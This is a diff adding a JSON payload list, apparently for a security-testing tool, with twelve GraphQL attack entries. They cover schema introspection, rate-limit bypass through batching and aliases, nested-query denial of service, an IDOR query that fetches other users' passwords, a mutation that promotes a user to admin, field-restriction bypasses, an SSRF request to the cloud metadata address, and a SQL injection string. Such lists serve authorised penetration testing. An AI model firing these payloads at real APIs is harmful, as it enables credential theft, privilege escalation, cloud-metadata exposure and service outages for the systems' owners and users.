@@ -1,0 +1,14 @@
+[
+  {"name":"Introspection Query","category":"GraphQL","description":"Full introspection to enumerate schema","payload":"{\n  __schema {\n    types {\n      name\n      fields {\n        name\n        type { name kind }\n      }\n    }\n  }\n}","tags":["introspection","enumeration"]},
+  {"name":"Type Introspection","category":"GraphQL","description":"Enumerate specific type fields","payload":"{ __type(name: \"User\") { fields { name type { name } } } }","tags":["introspection","enumeration"]},
+  {"name":"Batch Query Attack","category":"GraphQL","description":"Batch queries to bypass rate limiting","payload":"[{\"query\":\"{ user(id:1){email} }\"},{\"query\":\"{ user(id:2){email} }\"},{\"query\":\"{ user(id:3){email} }\"}]","tags":["batching","rate-limit-bypass"]},
+  {"name":"Alias Batching","category":"GraphQL","description":"Use aliases to batch operations","payload":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} }","tags":["alias","batching","rate-limit-bypass"]},
+  {"name":"Deeply Nested Query","category":"GraphQL","description":"DoS via deeply nested query","payload":"{ user { friends { friends { friends { friends { friends { name } } } } } } }","tags":["dos","nested","depth"]},
+  {"name":"GraphQL IDOR","category":"GraphQL","description":"IDOR via direct object ID manipulation","payload":"{ user(id: 2) { email password role } }","tags":["idor","privilege"]},
+  {"name":"Mutation Privilege Escalation","category":"GraphQL","description":"Mutation to escalate privileges","payload":"mutation { updateUser(id: 1, role: \"admin\") { id role } }","tags":["mutation","privilege-escalation"]},
+  {"name":"Fragments Bypass","category":"GraphQL","description":"Use fragments to bypass field restrictions","payload":"{ ...on Query { user(id:1) { ...F } } } fragment F on User { password email }","tags":["fragments","bypass"]},
+  {"name":"Directive Bypass","category":"GraphQL","description":"Use directives to bypass restrictions","payload":"{ user(id:1) @skip(if: false) { password } }","tags":["directives","bypass"]},
+  {"name":"Field Suggestion Probe","category":"GraphQL","description":"Trigger suggestions to enumerate hidden fields","payload":"{ user { pasword } }","tags":["suggestions","enumeration"]},
+  {"name":"SSRF via GraphQL","category":"GraphQL","description":"SSRF through URL input field","payload":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }","tags":["ssrf","mutation"]},
+  {"name":"SQL Injection via GraphQL","category":"GraphQL","description":"SQLi through GraphQL variables","payload":"{ user(name: \"admin' OR '1'='1\") { id email } }","tags":["sqli","injection"]}
+]
